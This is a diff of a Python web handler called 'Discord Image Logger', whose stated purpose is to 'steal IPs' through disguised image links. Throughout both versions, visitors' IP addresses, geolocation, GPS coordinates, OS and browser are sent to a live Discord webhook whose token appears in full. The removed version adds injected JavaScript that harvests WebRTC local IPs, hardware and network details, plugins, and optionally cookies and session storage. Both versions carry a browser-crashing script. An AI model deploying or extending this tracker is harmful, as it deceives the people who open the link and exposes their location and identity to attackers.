@@ -1,613 +1,304 @@
+# Discord Image Logger
+# By DeKrypt | https://github.com/dekrypted
+
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser, json, socket, time
-from datetime import datetime
+import traceback, requests, base64, httpagentparser
 
-__app__ = "Ultimate Discord Image Logger"
-__description__ = "Advanced IP and system information logger with maximum data collection"
-__version__ = "v4.0"
-__author__ = "Enhanced from DeKrypt's original"
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1393606647284240474/eKXLQCymBvY7bUkhinRce9uawJGkflevGcaRQ9blNoQK4frDA6tt09CC2rKOvOIcQ18a",
-    "image": "https://assets.telegraphindia.com/telegraph/2023/Jan/1672986231_rick-rolled.jpg",
-    "imageArgument": True,
+    "image": "https://assets.telegraphindia.com/telegraph/2023/Jan/1672986231_rick-rolled.jpg", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Ultimate Logger",
-    "color": 0x00FFFF,
-    "avatar_url": "",
-    "footer": "Ultimate Logger v4.0",
+    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False,
-    "accurateLocation": True,
-    "disableVpnCheck": False,
-    "extendedDataCollection": True,
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "message": {
-        "doMessage": True,
-        "message": "This device has been analyzed by our security systems.",
-        "richMessage": True,
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1,
-    "linkAlerts": True,
-    "buggedImage": True,
-    "antiBot": 1,
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+                # 0 = No Anti-VPN
+                # 1 = Don't ping when a VPN is suspected
+                # 2 = Don't send an alert when a VPN is suspected
 
-    # ENHANCED OPTIONS #
-    "collectScreenData": True,
-    "collectTimezone": True,
-    "collectLanguage": True,
-    "collectWebRTC": True,
-    "collectHardware": True,
-    "collectNetwork": True,
-    "collectCookies": False,
-    "collectSessionStorage": False,
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    # PERFORMANCE #
-    "timeout": 5,
-    "maxRetries": 2,
+    "antiBot": 1, # Prevents bots from triggering the alert
+                # 0 = No Anti-Bot
+                # 1 = Don't ping when it's possibly a bot
+                # 2 = Don't ping when it's 100% a bot
+                # 3 = Don't send an alert when it's possibly a bot
+                # 4 = Don't send an alert when it's 100% a bot
+    
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here"
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
+
+    # Please enter all values in correct format. Otherwise, it may break.
+    # Do not edit anything below this, unless you know what you're doing.
+    # NOTE: Hierarchy tree goes as follows:
+    # 1) Redirect (If this is enabled, disables image and crash browser)
+    # 2) Crash Browser (If this is enabled, disables image)
+    # 3) Message (If this is enabled, disables image)
+    # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164")
-
-def get_local_network_info():
-    try:
-        hostname = socket.gethostname()
-        local_ip = socket.gethostbyname(hostname)
-        return {"hostname": hostname, "local_ip": local_ip}
-    except:
-        return None
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+                                                           # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
-    bot_indicators = {
-        "34": "Discord",
-        "35": "Discord",
-        "TelegramBot": "Telegram",
-        "googlebot": "Google Bot",
-        "bingbot": "Bing Bot",
-        "yandex": "Yandex Bot",
-        "slurp": "Yahoo Bot",
-        "facebookexternalhit": "Facebook Crawler",
-        "twitterbot": "Twitter Bot"
-    }
-    
-    for indicator, name in bot_indicators.items():
-        if ip.startswith(indicator) if indicator.isdigit() else indicator.lower() in useragent.lower():
-            return name
-    return False
+    if ip.startswith(("34", "35")):
+        return "Discord"
+    elif useragent.startswith("TelegramBot"):
+        return "Telegram"
+    else:
+        return False
 
 def reportError(error):
-    error_embed = {
-        "username": config["username"],
-        "content": "@here",
-        "embeds": [
-            {
-                "title": "Logger Error",
-                "color": 0xFF0000,
-                "description": f"```\n{error[:1800]}\n```",
-                "timestamp": datetime.utcnow().isoformat(),
-                "footer": {"text": config["footer"]}
-            }
-        ]
-    }
-    if config.get("avatar_url"):
-        error_embed["avatar_url"] = config["avatar_url"]
-    
-    try:
-        requests.post(config["webhook"], json=error_embed, timeout=config["timeout"])
-    except:
-        pass
+    requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "@everyone",
+    "embeds": [
+        {
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        }
+    ],
+})
 
-def get_geolocation(ip):
-    retries = 0
-    while retries < config["maxRetries"]:
-        try:
-            response = requests.get(
-                f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
-                timeout=config["timeout"]
-            )
-            if response.status_code == 200:
-                return response.json()
-        except:
-            retries += 1
-            time.sleep(1)
-    return None
-
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, additional_data=None):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
-        return None
+        return
     
-    bot = botCheck(ip, useragent or "")
+    bot = botCheck(ip, useragent)
     
     if bot:
-        if config["linkAlerts"]:
-            alert_data = {
-                "username": config["username"],
-                "content": "",
-                "embeds": [
-                    {
-                        "title": "Bot Detected",
-                        "color": config["color"],
-                        "description": f"Bot interaction detected\n\n**IP:** `{ip}`\n**Type:** `{bot}`\n**Endpoint:** `{endpoint}`",
-                        "timestamp": datetime.utcnow().isoformat(),
-                        "footer": {"text": config["footer"]}
-                    }
-                ]
-            }
-            if config.get("avatar_url"):
-                alert_data["avatar_url"] = config["avatar_url"]
-            
-            try:
-                requests.post(config["webhook"], json=alert_data, timeout=config["timeout"])
-            except:
-                pass
-        return None
-
-    info = get_geolocation(ip) or {
-        "status": "fail",
-        "isp": "Unknown",
-        "as": "Unknown",
-        "country": "Unknown",
-        "regionName": "Unknown",
-        "city": "Unknown",
-        "lat": 0,
-        "lon": 0,
-        "timezone": "Unknown",
-        "mobile": False,
-        "proxy": False,
-        "hosting": False
-    }
-
-    if config["disableVpnCheck"]:
-        info["proxy"] = False
+        requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "",
+    "embeds": [
+        {
+            "title": "Image Logger - Link Sent",
+            "color": config["color"],
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+        }
+    ],
+}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+        return
 
     ping = "@everyone"
-    if info.get("proxy"):
+
+    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    if info["proxy"]:
         if config["vpnCheck"] == 2:
-            return info
+                return
+        
         if config["vpnCheck"] == 1:
             ping = ""
-
-    if info.get("hosting"):
+    
+    if info["hosting"]:
         if config["antiBot"] == 4:
-            if info.get("proxy"):
+            if info["proxy"]:
                 pass
             else:
-                return info
-        elif config["antiBot"] == 3:
-            return info
-        elif config["antiBot"] == 2:
-            if info.get("proxy"):
+                return
+
+        if config["antiBot"] == 3:
+                return
+
+        if config["antiBot"] == 2:
+            if info["proxy"]:
                 pass
             else:
                 ping = ""
-        elif config["antiBot"] == 1:
-            ping = ""
 
-    try:
-        os, browser = httpagentparser.simple_detect(useragent)
-    except:
-        os, browser = "Unknown", "Unknown"
+        if config["antiBot"] == 1:
+                ping = ""
 
-    extended_info = ""
-    if config["extendedDataCollection"] and additional_data:
-        extended_info = "\n**Extended Info:**"
-        if additional_data.get("screen"):
-            extended_info += f"\n> **Screen:** `{additional_data['screen']}`"
-        if additional_data.get("timezone"):
-            extended_info += f"\n> **Detailed Timezone:** `{additional_data['timezone']}`"
-        if additional_data.get("language"):
-            extended_info += f"\n> **Language:** `{additional_data['language']}`"
-        if additional_data.get("webRTC"):
-            extended_info += f"\n> **Local IP:** `{additional_data['webRTC']}`"
-        if additional_data.get("cpu"):
-            extended_info += f"\n> **CPU Cores:** `{additional_data['cpu']}`"
-        if additional_data.get("ram"):
-            extended_info += f"\n> **RAM:** `{additional_data['ram']}`"
-        if additional_data.get("gpu"):
-            extended_info += f"\n> **GPU:** `{additional_data['gpu']}`"
-        if additional_data.get("network"):
-            extended_info += f"\n> **Network:** `{additional_data['network']}`"
-        if additional_data.get("plugins"):
-            extended_info += f"\n> **Plugins:** `{', '.join(additional_data['plugins'])}`"
 
+    os, browser = httpagentparser.simple_detect(useragent)
+    
     embed = {
-        "username": config["username"],
-        "content": ping,
-        "embeds": [
-            {
-                "title": "ULTIMATE LOGGER - NEW HIT",
-                "color": config["color"],
-                "description": f"""**Complete System Profile**
+    "username": config["username"],
+    "content": ping,
+    "embeds": [
+        {
+            "title": "Image Logger - IP Logged",
+            "color": config["color"],
+            "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
-**Timestamp:** `{datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")}`
-
+            
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info.get('isp', 'Unknown')}`
-> **ASN:** `{info.get('as', 'Unknown')}`
-> **Country:** `{info.get('country', 'Unknown')} ({info.get('countryCode', '')})`
-> **Region:** `{info.get('regionName', 'Unknown')}`
-> **City:** `{info.get('city', 'Unknown')}`
-> **ZIP:** `{info.get('zip', 'Unknown')}`
-> **Coords:** `{str(info.get('lat', 0))+', '+str(info.get('lon', 0)) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[-1].replace('_', ' ')} ({info.get('timezone', 'Unknown').split('/')[0] if '/' in info.get('timezone', '') else 'Unknown'})`
-> **Mobile:** `{info.get('mobile', False)}`
-> **VPN/Proxy:** `{info.get('proxy', False)}`
-> **Hosting/Bot:** `{info.get('hosting', False)}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
-**System Info:**
+**PC Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
-> **User Agent:**
-    {useragent}
-                    "timestamp": datetime.utcnow().isoformat(),
-                "footer": {"text": config["footer"]}
-            }
-        ]
+
+**User Agent:**
+```
+{useragent}
+```""",
     }
+  ],
+}
     
-    if config.get("avatar_url"):
-        embed["avatar_url"] = config["avatar_url"]
-    
-    if url:
-        embed["embeds"][0].update({"thumbnail": {"url": url}})
-    
-    try:
-        requests.post(config["webhook"], json=embed, timeout=config["timeout"])
-    except:
-        pass
-    
+    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    requests.post(config["webhook"], json = embed)
     return info
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
+    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
-class UltimateLoggerAPI(BaseHTTPRequestHandler):
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    
     def handleRequest(self):
         try:
-            s = self.path
-            query = dict(parse.parse_qsl(parse.urlsplit(s).query))
-            
-            if config["imageArgument"] and (query.get("url") or query.get("id")):
-                url = base64.b64decode((query.get("url") or query.get("id")).encode()).decode()
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
             else:
                 url = config["image"]
+
+            data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''.encode()
             
-            additional_data = {}
-            ip = self.headers.get('x-forwarded-for') or self.headers.get('x-real-ip')
-            if not ip and hasattr(self, 'client_address'):
-                ip = self.client_address[0]
-            
-            if ip and ip.startswith(blacklistedIPs):
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
-            user_agent = self.headers.get('user-agent', 'Unknown')
-            if bot_check := botCheck(ip or "0.0.0.0", user_agent):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
-                self.end_headers()
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
-                if config["buggedImage"]:
-                    self.wfile.write(binaries["loading"])
-                
-                makeReport(ip, endpoint=s.split("?")[0], url=url)
                 return
             
-            location = None
-            if query.get("g") and config["accurateLocation"]:
-                try:
-                    location = base64.b64decode(query.get("g").encode()).decode()
-                except:
-                    pass
-            
-            if config["extendedDataCollection"]:
-                if query.get("screen") and config["collectScreenData"]:
-                    try:
-                        additional_data["screen"] = base64.b64decode(query.get("screen").encode()).decode()
-                    except:
-                        pass
-                
-                if query.get("tz") and config["collectTimezone"]:
-                    try:
-                        additional_data["timezone"] = base64.b64decode(query.get("tz").encode()).decode()
-                    except:
-                        pass
-                
-                if query.get("lang") and config["collectLanguage"]:
-                    try:
-                        additional_data["language"] = base64.b64decode(query.get("lang").encode()).decode()
-                    except:
-                        pass
-                
-                if query.get("rtc") and config["collectWebRTC"]:
-                    try:
-                        additional_data["webRTC"] = base64.b64decode(query.get("rtc").encode()).decode()
-                    except:
-                        pass
-                
-                if query.get("hw") and config["collectHardware"]:
-                    try:
-                        hw_data = json.loads(base64.b64decode(query.get("hw").encode()).decode())
-                        if isinstance(hw_data, dict):
-                            additional_data.update(hw_data)
-                    except:
-                        pass
-                
-                if query.get("net") and config["collectNetwork"]:
-                    try:
-                        additional_data["network"] = base64.b64decode(query.get("net").encode()).decode()
-                    except:
-                        pass
-                
-                if query.get("plugins") and config["extendedDataCollection"]:
-                    try:
-                        additional_data["plugins"] = json.loads(base64.b64decode(query.get("plugins").encode()).decode())
-                    except:
-                        pass
-            
-            result = makeReport(
-                ip,
-                user_agent,
-                location,
-                s.split("?")[0],
-                url,
-                additional_data
-            )
-            
-            message = config["message"]["message"]
-            
-            if config["message"]["richMessage"] and result:
-                replacements = {
-                    "{ip}": ip or "Unknown",
-                    "{isp}": result.get("isp", "Unknown"),
-                    "{asn}": result.get("as", "Unknown"),
-                    "{country}": result.get("country", "Unknown"),
-                    "{region}": result.get("regionName", "Unknown"),
-                    "{city}": result.get("city", "Unknown"),
-                    "{lat}": str(result.get("lat", 0)),
-                    "{long}": str(result.get("lon", 0)),
-                    "{timezone}": result.get("timezone", "Unknown").split('/')[-1].replace('_', ' '),
-                    "{mobile}": str(result.get("mobile", False)),
-                    "{vpn}": str(result.get("proxy", False)),
-                    "{bot}": str(result.get("hosting", False)),
-                    "{browser}": httpagentparser.simple_detect(user_agent)[1] if user_agent != "Unknown" else "Unknown",
-                    "{os}": httpagentparser.simple_detect(user_agent)[0] if user_agent != "Unknown" else "Unknown"
-                }
-                
-                for placeholder, value in replacements.items():
-                    message = message.replace(placeholder, value)
-            
-            if config["redirect"]["redirect"]:
-                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-            elif config["crashBrowser"]:
-                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
-            elif config["message"]["doMessage"]:
-                data = message.encode()
             else:
-                data = f'''<style>body {{
-                    margin: 0;
-                    padding: 0;
-                }}
-                div.img {{
-                    background-image: url('{url}');
-                    background-position: center center;
-                    background-repeat: no-repeat;
-                    background-size: contain;
-                    width: 100vw;
-                    height: 100vh;
-                }}</style><div class="img"></div>'''.encode()
-            
-            js_script = b""
-            if config["accurateLocation"]:
-                js_script += b"""
-<script>
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+
+                if dic.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                else:
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                
+
+                message = config["message"]["message"]
+
+                if config["message"]["richMessage"] and result:
+                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
+                datatype = 'text/html'
+
+                if config["message"]["doMessage"]:
+                    data = message.encode()
+                
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+
+                if config["redirect"]["redirect"]:
+                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["accurateLocation"]:
+                    data += b"""<script>
 var currenturl = window.location.href;
-if (!currenturl.includes("g=") && navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function(coords) {
-        var newUrl = currenturl.includes("?") ? 
-            currenturl + "&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D") :
-            currenturl + "?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
-        location.replace(newUrl);
-    }, function(error) {
-        console.log("Geolocation error:", error);
-    });
-}
-"""
-            
-            if config["extendedDataCollection"]:
-                js_script += b"""
-// Screen resolution
-if (!currenturl.includes("screen=")) {
-    var screenInfo = window.screen.width + "x" + window.screen.height + " (" + window.screen.colorDepth + "bit)";
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
     if (currenturl.includes("?")) {
-        currenturl += "&screen=" + btoa(screenInfo).replace(/=/g, "%3D");
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
     } else {
-        currenturl += "?screen=" + btoa(screenInfo).replace(/=/g, "%3D");
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
     }
-}
+    location.replace(currenturl);});
+}}
 
-// Timezone
-if (!currenturl.includes("tz=")) {
-    var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    if (currenturl.includes("?")) {
-        currenturl += "&tz=" + btoa(timezone).replace(/=/g, "%3D");
-    } else {
-        currenturl += "?tz=" + btoa(timezone).replace(/=/g, "%3D");
-    }
-}
-
-// Language
-if (!currenturl.includes("lang=")) {
-    var language = navigator.language || navigator.userLanguage;
-    if (currenturl.includes("?")) {
-        currenturl += "&lang=" + btoa(language).replace(/=/g, "%3D");
-    } else {
-        currenturl += "?lang=" + btoa(language).replace(/=/g, "%3D");
-    }
-}
-
-// WebRTC (local IP)
-if (!currenturl.includes("rtc=")) {
-    var rtcScript = document.createElement('script');
-    rtcScript.src = 'https://cdn.jsdelivr.net/npm/webrtc-adapter@7.4.0/adapter.min.js';
-    rtcScript.onload = function() {
-        var pc = new RTCPeerConnection({iceServers:[]});
-        pc.createDataChannel("");
-        pc.createOffer().then(function(offer) {
-            return pc.setLocalDescription(offer);
-        }).catch(function(e) {
-            console.log("WebRTC error:", e);
-        });
-        pc.onicecandidate = function(ice) {
-            if (ice.candidate) {
-                var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                var ipMatch = ipRegex.exec(ice.candidate.candidate);
-                if (ipMatch) {
-                    var localIp = ipMatch[1];
-                    if (currenturl.includes("?")) {
-                        currenturl += "&rtc=" + btoa(localIp).replace(/=/g, "%3D");
-                    } else {
-                        currenturl += "?rtc=" + btoa(localIp).replace(/=/g, "%3D");
-                    }
-                    location.replace(currenturl);
-                }
-            }
-        };
-    };
-    document.head.appendChild(rtcScript);
-}
-
-// Network info
-if (!currenturl.includes("net=")) {
-    var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (connection) {
-        var netInfo = {
-            type: connection.type,
-            effectiveType: connection.effectiveType,
-            downlink: connection.downlink + " Mbps",
-            rtt: connection.rtt + " ms",
-            saveData: connection.saveData
-        };
-        if (currenturl.includes("?")) {
-            currenturl += "&net=" + btoa(JSON.stringify(netInfo)).replace(/=/g, "%3D");
-        } else {
-            currenturl += "?net=" + btoa(JSON.stringify(netInfo)).replace(/=/g, "%3D");
-        }
-    }
-}
-
-// Hardware info
-if (!currenturl.includes("hw=")) {
-    var hardwareInfo = {};
-    hardwareInfo.cpu = navigator.hardwareConcurrency || "Unknown";
-    if (navigator.deviceMemory) {
-        hardwareInfo.ram = navigator.deviceMemory + " GB";
-    }
-    if (navigator.gpu) {
-        navigator.gpu.requestAdapter().then(function(adapter) {
-            hardwareInfo.gpu = adapter.name || "Unknown";
-            hardwareInfo.gpuFeatures = adapter.features || [];
-            if (currenturl.includes("?")) {
-                currenturl += "&hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
-            } else {
-                currenturl += "?hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
-            }
-            location.replace(currenturl);
-        }).catch(function() {
-            if (currenturl.includes("?")) {
-                currenturl += "&hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
-            } else {
-                currenturl += "?hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
-            }
-            location.replace(currenturl);
-        });
-    } else {
-        if (currenturl.includes("?")) {
-            currenturl += "&hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
-        } else {
-            currenturl += "?hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
-        }
-    }
-}
-
-// Browser plugins
-if (!currenturl.includes("plugins=") && navigator.plugins) {
-    var plugins = [];
-    for (var i = 0; i < navigator.plugins.length; i++) {
-        plugins.push(navigator.plugins[i].name);
-    }
-    if (plugins.length > 0) {
-        if (currenturl.includes("?")) {
-            currenturl += "&plugins=" + btoa(JSON.stringify(plugins)).replace(/=/g, "%3D");
-        } else {
-            currenturl += "?plugins=" + btoa(JSON.stringify(plugins)).replace(/=/g, "%3D");
-        }
-    }
-}
-
-// Session storage
-if (!currenturl.includes("session=") && config["collectSessionStorage"] && window.sessionStorage) {
-    try {
-        var sessionData = {};
-        for (var i = 0; i < sessionStorage.length; i++) {
-            var key = sessionStorage.key(i);
-            sessionData[key] = sessionStorage.getItem(key);
-        }
-        if (Object.keys(sessionData).length > 0) {
-            if (currenturl.includes("?")) {
-                currenturl += "&session=" + btoa(JSON.stringify(sessionData)).replace(/=/g, "%3D");
-            } else {
-                currenturl += "?session=" + btoa(JSON.stringify(sessionData)).replace(/=/g, "%3D");
-            }
-        }
-    } catch(e) {}
-}
-
-// Cookies
-if (!currenturl.includes("cookies=") && config["collectCookies"] && document.cookie) {
-    try {
-        if (currenturl.includes("?")) {
-            currenturl += "&cookies=" + btoa(document.cookie).replace(/=/g, "%3D");
-        } else {
-            currenturl += "?cookies=" + btoa(document.cookie).replace(/=/g, "%3D");
-        }
-    } catch(e) {}
-}
-
-setTimeout(function() {
-    if (currenturl !== window.location.href) {
-        location.replace(currenturl);
-    }
-}, 500);
-</script>
-"""
-            
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(data + js_script)
+</script>"""
+                self.wfile.write(data)
         
-        except Exception as e:
+        except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error')
+
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
             reportError(traceback.format_exc())
 
+        return
+    
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = app = UltimateLoggerAPI
+handler = app = ImageLoggerAPI
